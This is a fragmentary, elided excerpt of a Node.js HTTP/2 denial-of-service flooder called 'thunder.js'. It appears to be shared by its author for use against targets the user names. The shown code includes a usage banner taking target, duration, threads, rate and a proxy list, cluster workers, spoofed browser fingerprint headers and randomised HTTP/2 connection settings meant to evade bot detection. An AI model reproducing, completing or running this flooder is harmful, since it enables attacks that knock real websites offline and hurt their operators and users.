...
if (process.argv.length < 8) {
    console.clear();
    console.log(banner);
    console.log(`Version: 2.0 fix signature http-ddos 2% //Updated By @KuroService\nExample: node thunder.js <method(GET-POST)> <target> <time> <thread> <ratelimit(auto-100)> <proxy> <delay(1-20)>\n Enter the query as above, if you don't understand how to use it, please contact me @KuroService`);
    process.exit();
}
 ...
 function readLines(filePath) {
    if (!filePath) {
        console.log("Tidak ada file yang anda masukan");
        return;
    }
    try {
...
function encryptBaloo(inputText, keyText) {
    keyText = CryptoJS.enc.Utf8.parse(keyText);
    let iv = CryptoJS.enc.Utf8.parse('8569503038252676');
    let encrypted = CryptoJS.AES.encrypt(inputText, keyText, {
        iv: iv,
...
const ratelimit = process.argv[6] === 'auto' ? 30 : ~~process.argv[6] || 30;
var lengpx = readLines(args.proxyFile);

if (cluster.isMaster){
  console.clear();
  console.log(banner);
  console.log(`> Request: ${process.argv[2]}\n> Target: ${process.argv[3]}\n> Time: ${process.argv[4]}\n> Threads: ${process.argv[5]}x\n> Rps: ${ratelimit}\n> Proxy: ${process.argv[7]} (${lengpx.length})\n> Method: ThunderV2\n> Started: ${started()}`);
...
headers['x-client-session'] = 'none';
headers['sec-fetch-users'] = '?0';
headers['x-request-data'] = 'dynamic';
headers['x-requested-with'] = 'XMLHttpRequest';
 ...
 function runFlooder() {
    ...
    const secGpcValue = isBrave ? "1" : undefined;
     ...
     headers["sec-ch-ua"] = `"Not A(Brand";v="99", "Chromium";v="121", "${wfwf}";v="121"`;
        ...
        tlsConn.setMaxListeners(0); 
         ...
         const client = http2.connect(parsedTarget.href, {
            ...
            headerTableSize: Math.random() < 0.5 ? 65535 : 65536,
                ...
                maxHeaderListSize: Math.random() < 0.5 ? 262144 : 2621454,
            enablePush: false
          },
